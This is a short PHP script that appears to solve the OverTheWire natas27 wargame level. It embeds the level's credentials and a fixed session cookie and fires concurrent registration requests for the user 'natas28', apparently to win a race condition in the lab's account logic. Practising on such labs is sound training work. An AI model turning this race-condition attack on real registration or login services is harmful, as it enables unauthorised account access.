<?php
$url = "http://natas27.natas.labs.overthewire.org/";
$creds = "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne";
$data = "username=natas28&password=1";

$ch_1 = curl_init();
$ch_2 = curl_init();

curl_setopt($ch_1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch_2, CURLOPT_RETURNTRANSFER, 1);

curl_setopt($ch_1, CURLOPT_URL, $url);
curl_setopt($ch_2, CURLOPT_URL, $url);

curl_setopt($ch_1, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch_2, CURLOPT_POSTFIELDS, $data);

curl_setopt($ch_1, CURLOPT_USERPWD,$creds);
curl_setopt($ch_2, CURLOPT_USERPWD,$creds);

curl_setopt($ch_1, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
curl_setopt($ch_2, CURLOPT_HTTPAUTH, CURLAUTH_ANY);

curl_setopt($ch_1, CURLOPT_COOKIE, "PHPSESSID=stayhard");
curl_setopt($ch_2, CURLOPT_COOKIE, "PHPSESSID=stayhard");

$mch = curl_multi_init();

curl_multi_add_handle($mch, $ch_1);
curl_multi_add_handle($mch, $ch_2);


$now = microtime(1);
$until = $now + 360;
$one = 1;
while($now < $until){
    
    do{ 
        $status = curl_multi_exec($mch, $running);
        curl_multi_select($mch); 
    }while($running > 0);
    
    $response1= curl_multi_getcontent($ch_1);
    $response2= curl_multi_getcontent($ch_2);
    
    if($one== 1){
        echo "$response1\n$response2";
        $one--;
    }

    $now = microtime(1);
    $printTime = $now /1000000;
    echo "$printTime\n";
    if(strstr($response1, "created")||strstr($response2,"created")){
        $curr_time = DateTime::createFromFormat('U.u', microtime(1));
        file_put_contents("multi_log.txt", $response1 . $response2 . $curr_time->format("Y.m.d H:m:s.u"), FILE_APPEND);
        break;
    }

}
curl_multi_close($mch);
echo "done and closed!\n";
?>

